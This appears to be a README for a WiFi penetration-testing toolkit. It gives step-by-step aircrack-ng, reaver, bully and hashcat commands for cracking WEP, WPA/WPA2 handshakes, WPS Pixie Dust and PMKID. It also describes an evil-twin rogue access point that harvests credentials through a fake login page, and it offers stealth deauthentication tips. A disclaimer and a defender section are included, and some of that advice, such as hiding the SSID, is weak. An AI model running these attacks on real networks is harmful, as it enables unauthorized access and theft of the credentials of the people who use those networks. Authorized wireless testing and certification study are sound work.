# Wireless Attack Framework

Comprehensive WiFi security auditing and penetration testing toolkit using aircrack-ng suite and related tools.

## ⚠️ LEGAL DISCLAIMER

**CRITICAL WARNING:** These tools are for AUTHORIZED security testing ONLY!

- Only test networks you own or have explicit written permission to test
- Unauthorized access to wireless networks is ILLEGAL in most jurisdictions
- Violators may face criminal prosecution and civil liability
- Use responsibly and ethically

## 📦 Scripts Included

### 1. **auto_wifi_crack.sh** - All-in-One Automated WiFi Cracker
Complete automated solution with interactive menu.

**Features:**
- Automated attack mode (tries all methods)
- WPS attack (Pixie Dust)
- WPA/WPA2 handshake capture + dictionary attack
- WEP attack (ARP replay)
- Network scanning
- User-friendly interface

**Usage:**
```bash
sudo ./auto_wifi_crack.sh
```

---

### 2. **wifi_security_auditor.sh** - Comprehensive Security Auditor
Full-featured wireless security assessment tool.

**Features:**
- Multiple attack modes
- WEP, WPA/WPA2, WPS support
- PMKID attack (clientless)
- Handshake capture with verification
- Detailed reporting
- Organized output

**Usage:**
```bash
sudo ./wifi_security_auditor.sh
```

---

### 3. **wps_attack_suite.sh** - Specialized WPS Attacks
Focused WPS PIN attack tool.

**Features:**
- Pixie Dust attack (Reaver)
- Pixie Dust attack (Bully)
- WPS PIN brute force
- Multiple attack methods

**Usage:**
```bash
sudo ./wps_attack_suite.sh <monitor_interface>
```

---

### 4. **handshake_capture.sh** - Optimized Handshake Capture
Fast and reliable WPA/WPA2 handshake capture.

**Features:**
- Automated deauthentication
- Handshake verification
- Multiple capture attempts
- Hashcat format conversion

**Usage:**
```bash
sudo ./handshake_capture.sh <monitor_interface> <bssid> <channel> [essid]
```

---

### 5. **evil_twin_attack.sh** - Rogue AP Attack
Creates fake access point for credential harvesting.

**Features:**
- Fake AP creation
- DHCP server
- DNS spoofing
- Client deauthentication
- Connection logging

**Usage:**
```bash
sudo ./evil_twin_attack.sh <interface> <target_ssid> <target_bssid> <channel>
```

---

## 🛠️ Installation & Requirements

### Required Tools

```bash
# Install aircrack-ng suite
sudo apt update
sudo apt install aircrack-ng

# Install WPS tools
sudo apt install reaver bully pixiewps

# Install additional tools
sudo apt install hostapd dnsmasq hcxtools

# Optional: GPU cracking
sudo apt install hashcat
```

### Wordlist Setup

```bash
# Extract rockyou.txt
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# Or download
wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
sudo mv rockyou.txt /usr/share/wordlists/
```

### Hardware Requirements

- **Wireless adapter with monitor mode support**
- Recommended chipsets:
  - Atheros AR9271 (Alfa AWUS036NHA)
  - Ralink RT3070 (Alfa AWUS036NH)
  - Realtek RTL8187L (Alfa AWUS036H)

**Check compatibility:**
```bash
airmon-ng
iwconfig
```

---

## 🚀 Quick Start Guide

### Basic Workflow

```bash
# 1. Enable monitor mode
sudo airmon-ng start wlan0

# 2. Scan for networks
sudo airodump-ng wlan0mon

# 3. Run automated attack
sudo ./auto_wifi_crack.sh

# 4. Follow interactive prompts
```

### Attack Type Selection

**Choose based on target:**

| Encryption | Best Attack | Speed | Success Rate |
|------------|-------------|-------|--------------|
| WEP | ARP Replay | Fast | Very High |
| WPA/WPA2 | WPS Pixie Dust | Very Fast | Medium |
| WPA/WPA2 | Handshake + Dictionary | Slow | Depends on wordlist |
| WPA/WPA2 | PMKID | Fast | Medium |
| WPA2-Enterprise | Evil Twin | Medium | High (social engineering) |

---

## 📚 Attack Methods Explained

### 1. WEP Attack (ARP Replay)

**How it works:**
1. Capture initialization vectors (IVs)
2. Inject ARP packets to generate traffic
3. Crack key using statistical analysis

**Commands:**
```bash
# Start capture
airodump-ng -c <channel> --bssid <bssid> -w capture wlan0mon

# Fake authentication
aireplay-ng -1 0 -a <bssid> wlan0mon

# ARP replay
aireplay-ng -3 -b <bssid> wlan0mon

# Crack
aircrack-ng capture-01.cap
```

**Time:** 5-30 minutes
**Success Rate:** ~95% (WEP is broken)

---

### 2. WPA/WPA2 Handshake Attack

**How it works:**
1. Capture 4-way handshake
2. Deauthenticate clients to force reconnection
3. Dictionary attack on captured handshake

**Commands:**
```bash
# Capture handshake
airodump-ng -c <channel> --bssid <bssid> -w handshake wlan0mon

# Deauth clients (in another terminal)
aireplay-ng --deauth 10 -a <bssid> wlan0mon

# Crack with aircrack-ng
aircrack-ng -w rockyou.txt handshake-01.cap

# Or convert for hashcat (GPU)
hcxpcapngtool -o handshake.22000 handshake-01.cap
hashcat -m 22000 handshake.22000 rockyou.txt
```

**Time:** Depends on password strength and wordlist
**Success Rate:** Depends on password in wordlist

---

### 3. WPS Pixie Dust Attack

**How it works:**
1. Exploit weak random number generation in WPS
2. Extract WPS PIN without brute force
3. Use PIN to get WPA password

**Commands:**
```bash
# Scan for WPS
wash -i wlan0mon

# Pixie Dust with Reaver
reaver -i wlan0mon -b <bssid> -c <channel> -vv -K

# Pixie Dust with Bully
bully wlan0mon -b <bssid> -c <channel> -d -v 3
```

**Time:** 5-15 minutes
**Success Rate:** ~30% (depends on router)

---

### 4. PMKID Attack (Clientless)

**How it works:**
1. Capture PMKID from AP (no clients needed)
2. Crack PMKID with dictionary attack

**Commands:**
```bash
# Capture PMKID
airodump-ng -c <channel> --bssid <bssid> -w pmkid wlan0mon

# Convert to hashcat format
hcxpcapngtool -o pmkid.22000 pmkid-01.cap

# Crack
hashcat -m 22000 pmkid.22000 rockyou.txt
```

**Time:** Depends on password strength
**Success Rate:** Medium (newer routers may be patched)

---

### 5. Evil Twin Attack

**How it works:**
1. Create fake AP with same SSID
2. Deauth clients from real AP
3. Clients connect to fake AP
4. Capture credentials via fake login page

**Setup:**
```bash
# Create fake AP
sudo ./evil_twin_attack.sh wlan0mon "Target_Network" <bssid> <channel>

# Clients will be prompted for password
# Captured credentials logged to output directory
```

**Time:** Depends on user interaction
**Success Rate:** High (social engineering dependent)

---

## 🎯 Usage Examples

### Example 1: Quick WPS Attack

```bash
# Enable monitor mode
sudo airmon-ng start wlan0

# Run WPS attack
sudo ./wps_attack_suite.sh wlan0mon

# Enter target BSSID when prompted
# Wait for Pixie Dust result
```

### Example 2: Capture and Crack WPA2

```bash
# Enable monitor mode
sudo airmon-ng start wlan0

# Capture handshake
sudo ./handshake_capture.sh wlan0mon AA:BB:CC:DD:EE:FF 6 "MyNetwork"

# Crack with custom wordlist
aircrack-ng -w /path/to/wordlist.txt handshake-01.cap
```

### Example 3: Automated Full Attack

```bash
# Run automated script
sudo ./auto_wifi_crack.sh

# Select option 1 (Automated attack)
# Select your wireless interface
# Wait for network scan
# Select target network
# Script tries all attack methods automatically
```

---

## 📊 Success Factors

### Factors Affecting Success

**WEP:**
- ✅ Always crackable (protocol is broken)
- ⏱️ Requires active clients or packet injection

**WPA/WPA2:**
- ✅ Password in wordlist
- ✅ Weak password
- ❌ Strong random password
- ❌ Password not in wordlist

**WPS:**
- ✅ WPS enabled
- ✅ Vulnerable to Pixie Dust
- ❌ WPS disabled
- ❌ Rate limiting enabled
- ❌ Patched firmware

---

## 🔧 Troubleshooting

### Monitor Mode Issues

```bash
# Kill interfering processes
sudo airmon-ng check kill

# Restart network manager after testing
sudo service NetworkManager start

# Check if monitor mode is enabled
iwconfig
```

### No Handshake Captured

**Solutions:**
- Wait for clients to connect naturally
- Increase deauth packet count
- Try different deauth methods
- Ensure clients are connected to target AP
- Check signal strength (get closer)

### WPS Attack Fails

**Solutions:**
- Verify WPS is enabled: `wash -i wlan0mon`
- Try different tools (Reaver vs Bully)
- Check for rate limiting (wait between attempts)
- Some routers are patched against Pixie Dust

### Aircrack-ng Not Finding Password

**Solutions:**
- Use larger wordlist
- Try hashcat with GPU acceleration
- Generate custom wordlist based on target
- Use rule-based attacks
- Consider brute force (very slow)

---

## 💡 Pro Tips

### Wordlist Optimization

```bash
# Create custom wordlist from target info
crunch 8 12 -t Target@@@ > custom.txt

# Combine multiple wordlists
cat wordlist1.txt wordlist2.txt | sort -u > combined.txt

# Use rules with hashcat
hashcat -m 22000 handshake.22000 rockyou.txt -r best64.rule
```

### Faster Cracking

```bash
# Use GPU with hashcat (much faster)
hashcat -m 22000 -w 3 handshake.22000 rockyou.txt

# Distributed cracking
# Split wordlist and crack on multiple machines

# Use rainbow tables (precomputed)
cowpatty -r handshake-01.cap -d rainbow_table.db -s "SSID"
```

### Stealth Techniques

```bash
# Reduce deauth packet count
aireplay-ng --deauth 1 -a <bssid> wlan0mon

# Use targeted deauth (specific client)
aireplay-ng --deauth 5 -a <bssid> -c <client_mac> wlan0mon

# Passive monitoring (no injection)
# Just wait for natural handshakes
```

---

## 📁 Output Files

### File Types Generated

```
wifi_audit_<timestamp>/
├── scan-01.csv                    # Network scan results
├── handshake-01.cap               # Captured handshake
├── handshake.22000                # Hashcat format
├── crack_result.txt               # Cracking results
├── wps_scan.txt                   # WPS-enabled networks
├── pixie_dust.log                 # WPS attack log
└── audit_report.txt               # Summary report
```

---

## 🔐 Security Best Practices

### For Testers

1. **Always get written authorization**
2. **Document everything**
3. **Stay within scope**
4. **Protect captured data**
5. **Report findings responsibly**
6. **Clean up after testing**

### For Network Owners

**Protect your network:**
- ✅ Use WPA3 if available
- ✅ Disable WPS
- ✅ Use strong, random passwords (20+ characters)
- ✅ Enable MAC filtering (additional layer)
- ✅ Hide SSID (security through obscurity)
- ✅ Regular firmware updates
- ✅ Monitor for rogue APs
- ✅ Use enterprise authentication (802.1X)

---

## 📖 Additional Resources

### Learning

- [Aircrack-ng Documentation](https://www.aircrack-ng.org/)
- [Wireless Security on Kali](https://www.kali.org/docs/wireless/)
- [WiFi Hacking Guide](https://null-byte.wonderhowto.com/how-to/wi-fi-hacking/)

### Tools

- [Wifite](https://github.com/derv82/wifite2) - Automated wireless auditor
- [Fluxion](https://github.com/FluxionNetwork/fluxion) - Social engineering WPA attack
- [WiFi-Pumpkin](https://github.com/P0cL4bs/wifipumpkin3) - Rogue AP framework

### Wordlists

- [SecLists](https://github.com/danielmiessler/SecLists)
- [CrackStation](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
- [WeakPass](https://weakpass.com/)

---

## 🐛 Known Issues

1. **Some adapters don't support packet injection**
   - Solution: Use compatible adapter (see hardware requirements)

2. **Monitor mode not working on some systems**
   - Solution: Update drivers or use external adapter

3. **Hashcat not using GPU**
   - Solution: Install proper GPU drivers (CUDA/OpenCL)

4. **NetworkManager interfering**
   - Solution: `sudo airmon-ng check kill`

---

## 🤝 Contributing

Improvements welcome! Consider:
- Additional attack methods
- Better error handling
- Performance optimizations
- Documentation improvements

---

## 📄 License

These scripts are provided for educational and authorized security testing purposes only.

**Use at your own risk. Authors are not responsible for misuse.**

---

## 🎓 Certification Prep

These tools are useful for:
- **OSWP** (Offensive Security Wireless Professional)
- **CEH** (Certified Ethical Hacker)
- **GPEN** (GIAC Penetration Tester)
- **Security+** (CompTIA)

---

**Remember: With great power comes great responsibility. Hack ethically! 🔐**
